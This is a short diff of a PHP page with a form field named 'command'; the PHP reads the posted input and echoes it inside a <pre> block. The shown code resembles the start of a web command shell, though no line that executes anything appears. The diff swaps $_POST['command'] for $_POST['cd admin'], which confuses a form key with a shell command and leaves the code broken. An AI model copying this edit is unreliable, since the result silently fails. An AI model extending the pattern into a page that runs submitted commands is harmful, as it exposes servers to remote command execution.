@@ -4,7 +4,7 @@ Datei? <input type="text" name="command">
 </form>
 
 <?php
-$command = $_POST["command"];
+$command = $_POST["cd admin"];
 
 
 echo "<pre>";
